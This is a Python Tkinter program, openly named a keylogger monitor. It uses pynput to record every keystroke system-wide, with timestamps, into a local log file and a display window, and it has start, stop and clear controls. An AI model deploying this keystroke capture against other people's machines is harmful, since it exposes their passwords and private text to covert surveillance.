import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput import keyboard
import threading
from datetime import datetime


class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Monitor")
        self.root.geometry("600x400")

        self.is_logging = False
        self.log_file = "keystrokes.log"
        self.keyboard_listener = None

        self.setup_gui()

    def setup_gui(self):
        # Control buttons
        self.btn_frame = tk.Frame(self.root)
        self.btn_frame.pack(pady=10)

        self.start_btn = tk.Button(
            self.btn_frame,
            text="Start Logging",
            command=self.start_logging,
            bg="green",
            fg="white",
        )
        self.start_btn.pack(side=tk.LEFT, padx=5)

        self.stop_btn = tk.Button(
            self.btn_frame,
            text="Stop Logging",
            command=self.stop_logging,
            bg="red",
            fg="white",
            state=tk.DISABLED,
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)

        self.clear_btn = tk.Button(
            self.btn_frame,
            text="Clear Log",
            command=self.clear_log,
        )
        self.clear_btn.pack(side=tk.LEFT, padx=5)

        # Status label
        self.status_label = tk.Label(self.root, text="Status: Stopped", fg="red")
        self.status_label.pack(pady=5)

        # Log display
        self.log_text = scrolledtext.ScrolledText(self.root, width=70, height=20)
        self.log_text.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)

        # Load existing log
        self.load_log()

    def on_key_event(self, key):
        if not self.is_logging:
            return

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            key_name = key.char if hasattr(key, "char") and key.char else str(key)
        except:
            key_name = str(key)

        log_entry = f"{timestamp} - {key_name}\n"

        # Append to file
        with open(self.log_file, "a") as f:
            f.write(log_entry)

        # Update GUI
        self.log_text.insert(tk.END, log_entry)
        self.log_text.see(tk.END)

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            self.status_label.config(text="Status: Logging", fg="green")

            # Run listener in background thread
            self.keyboard_listener = keyboard.Listener(on_release=self.on_key_event)
            self.keyboard_listener.daemon = True
            self.keyboard_listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.status_label.config(text="Status: Stopped", fg="red")

            if self.keyboard_listener:
                self.keyboard_listener.stop()
                self.keyboard_listener = None

    def load_log(self):
        try:
            with open(self.log_file, "r") as f:
                content = f.read()
                self.log_text.insert(tk.END, content)
                self.log_text.see(tk.END)
        except FileNotFoundError:
            self.log_text.insert(
                tk.END, "No log file found. Start logging to begin.\n"
            )

    def clear_log(self):
        if messagebox.askyesno("Confirm", "Clear all log data?"):
            self.log_text.delete(1.0, tk.END)
            try:
                with open(self.log_file, "w") as f:
                    f.write("")
            except Exception:
                pass


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
